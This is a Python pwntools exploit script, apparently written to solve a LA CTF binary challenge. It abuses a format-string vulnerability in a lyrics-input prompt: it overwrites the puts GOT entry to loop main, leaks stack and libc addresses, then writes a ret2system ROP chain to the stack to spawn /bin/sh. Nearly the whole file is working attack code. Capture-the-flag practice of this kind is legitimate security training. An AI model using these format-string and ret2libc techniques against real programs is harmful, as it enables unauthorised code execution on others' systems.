from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

if REMOTE:
    libc = ELF('./rlibc.so.6')
else:
    libc = e.libc

gs = '''
break *0x4011f3
continue
'''

#NUM = 8
#NUM2 = 10

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("lac.tf",31135)
    else:
        return process(e.path)


p = start()

def loop_main():
   log.info(b'Looping Main')
   log.info(b'---------------------------------------')
   pause()
   main_bypass = 0x40117d
   payload_writes = {
        e.got['puts']     : main_bypass,

   }
   payload = fmtstr_payload(6,payload_writes,write_size='short')
   p.sendlineafter(b'Lyrics:',payload)

def ret_leaks():
   log.info(b'Returning Stack, Libc Leaks')
   log.info(b'---------------------------------------')
   pause()
   chain = b'%37$p.%40$p'
   p.sendlineafter(b'Lyrics:',chain)
   p.recvuntil(b'Never gonna run around and')
   leaks=p.recvline().strip(b'\n').strip(b' ').split(b'.')
   return leaks


def ret2sys():
   log.info(b'Writing Ret2System to Stack')
   log.info(b'---------------------------------------')
   payload_writes = {
        e.got['puts'] : libc.sym['puts'],
        stack : r.find_gadget(['pop rdi','ret'])[0],
        stack +8 : next(libc.search(b'/bin/sh')),
        stack +16 : libc.sym['system']
   }
   payload = fmtstr_payload(8,payload_writes,write_size='short')
   p.sendlineafter(b'Lyrics:',payload)

loop_main()
leaks=ret_leaks()

stack_leak = int(leaks[0],16)
stack=stack_leak-(0x7ffeee3ecf30-0x7ffeee3ece48)
libc.address = int(leaks[1],16)-(libc.sym['__libc_start_main']+234)

log.info(b'Libc    : 0x%x' %libc.address)
log.info(b'Stack   : 0x%x' %stack)
log.info(b'---------------------------------------')
pause()

ret2sys()
p.interactive()
